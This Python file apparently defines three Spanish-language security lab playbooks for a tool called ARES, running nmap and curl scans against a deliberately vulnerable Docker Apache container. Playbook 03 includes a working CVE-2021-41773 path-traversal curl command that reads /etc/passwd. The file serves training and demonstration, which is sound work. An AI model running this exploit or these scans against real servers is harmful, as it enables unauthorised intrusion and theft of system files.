PROMPTS = [
    {
        "id": "playbook-01",
        "title": "PLAYBOOK 01",
        "subtitle": "Reconocimiento Web",
        "description": "Escanea y enumera tecnologías, puertos y vulnerabilidades de un servidor web objetivo.",
        "icon": "Search",
        "color": "cyan",
        "badge": "Básico",
        "duration": "20 s",
        "tools": ["Nmap", "WhatWeb", "Nikto"],
        "steps": [
            {
                "id": "deploy",
                "name": "Desplegar entorno Docker",
                "description": "Inicia el escenario Apache CVE-2021-41773 en Docker",
                "type": "docker_deploy",
                "config": {"scenario": "apache-backdoor"},
            },
            {
                "id": "recon",
                "name": "Escaneo de puertos",
                "description": "Nmap para descubrir puertos y servicios abiertos",
                "type": "command",
                "config": {
                    "command": ["nmap", "-sV", "-T4", "--open", "-p", "1-1000", "{TARGET_IP}"],
                    "timeout": 120,
                },
            },
            {
                "id": "analyze",
                "name": "Análisis de vulnerabilidades",
                "description": "ARES analiza los resultados del escaneo con IA",
                "type": "llm_analyze",
                "config": {
                    "prompt_template": "Analiza estos resultados de nmap e identifica vulnerabilidades conocidas:\n{STEP_OUTPUT}",
                },
            },
            {
                "id": "cleanup",
                "name": "Limpiar entorno",
                "description": "Detiene y elimina los contenedores Docker",
                "type": "docker_destroy",
                "config": {"scenario": "apache-backdoor"},
            },
        ],
    },
    {
        "id": "playbook-02",
        "title": "PLAYBOOK 02",
        "subtitle": "OWASP Scan",
        "description": "Evalúa un servidor web contra las vulnerabilidades OWASP Top 10.",
        "icon": "ShieldAlert",
        "color": "red",
        "badge": "Intermedio",
        "duration": "45 s",
        "tools": ["Nmap", "Curl", "Nikto"],
        "steps": [
            {
                "id": "deploy",
                "name": "Desplegar entorno Docker",
                "description": "Inicia el escenario vulnerable en Docker",
                "type": "docker_deploy",
                "config": {"scenario": "apache-backdoor"},
            },
            {
                "id": "recon",
                "name": "Enumeración web",
                "description": "Identifica tecnologías y endpoints del servidor web",
                "type": "command",
                "config": {
                    "command": ["curl", "-sI", "http://{TARGET_IP}"],
                    "timeout": 30,
                },
            },
            {
                "id": "deep-scan",
                "name": "Escaneo profundo",
                "description": "Escaneo detallado con Nmap de servicios y versiones",
                "type": "command",
                "config": {
                    "command": ["nmap", "-sV", "-sC", "-T4", "-p-", "--min-rate", "1000", "{TARGET_IP}"],
                    "timeout": 180,
                },
            },
            {
                "id": "analyze",
                "name": "Análisis con IA",
                "description": "ARES interpreta los resultados y genera recomendaciones",
                "type": "llm_analyze",
                "config": {
                    "prompt_template": "Eres un analista de seguridad. Analiza estos resultados de escaneo y proporciona:\n1. Vulnerabilidades encontradas\n2. Nivel de criticidad\n3. Recomendaciones de mitigación\n\nResultados:\n{STEP_OUTPUT}",
                },
            },
            {
                "id": "cleanup",
                "name": "Limpiar entorno",
                "description": "Detiene los contenedores Docker",
                "type": "docker_destroy",
                "config": {"scenario": "apache-backdoor"},
            },
        ],
    },
    {
        "id": "playbook-03",
        "title": "PLAYBOOK 03",
        "subtitle": "Apache Path Traversal Demo",
        "description": "Demostración práctica de explotación de la vulnerabilidad CVE-2021-41773 en Apache.",
        "icon": "FlaskConical",
        "color": "purple",
        "badge": "CVE-2021-41773",
        "duration": "30 s",
        "tools": ["Curl", "Docker"],
        "steps": [
            {
                "id": "deploy",
                "name": "Desplegar entorno vulnerable",
                "description": "Inicia Apache con la vulnerabilidad CVE-2021-41773",
                "type": "docker_deploy",
                "config": {"scenario": "apache-backdoor"},
            },
            {
                "id": "verify",
                "name": "Verificar vulnerabilidad",
                "description": "Confirma que el servicio está accesible",
                "type": "command",
                "config": {
                    "command": ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "http://{TARGET_IP}"],
                    "timeout": 15,
                },
            },
            {
                "id": "exploit",
                "name": "Explotar CVE-2021-41773",
                "description": "Ejecuta el path traversal contra Apache",
                "type": "command",
                "config": {
                    "command": ["curl", "-s", "--path-as-is", "http://{TARGET_IP}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"],
                    "timeout": 30,
                },
            },
            {
                "id": "analyze",
                "name": "Análisis del exploit",
                "description": "ARES explica el impacto y las mitigaciones",
                "type": "llm_analyze",
                "config": {
                    "prompt_template": "Analiza este resultado de explotación CVE-2021-41773 (Apache Path Traversal):\n\nOutput del exploit:\n{STEP_OUTPUT}\n\nExplica:\n1. Qué ocurrió técnicamente\n2. Impacto de seguridad\n3. Cómo mitigar esta vulnerabilidad",
                },
            },
            {
                "id": "cleanup",
                "name": "Limpiar entorno",
                "description": "Detiene los contenedores Docker",
                "type": "docker_destroy",
                "config": {"scenario": "apache-backdoor"},
            },
        ],
    },
]


def get_prompt(prompt_id: str) -> dict | None:
    for p in PROMPTS:
        if p["id"] == prompt_id:
            return p
    return None


def list_prompts() -> list[dict]:
    return [
        {
            "id": p["id"],
            "title": p["title"],
            "subtitle": p.get("subtitle", ""),
            "description": p["description"],
            "icon": p["icon"],
            "color": p["color"],
            "badge": p.get("badge", ""),
            "duration": p.get("duration", ""),
            "tools": p.get("tools", []),
        }
        for p in PROMPTS
    ]
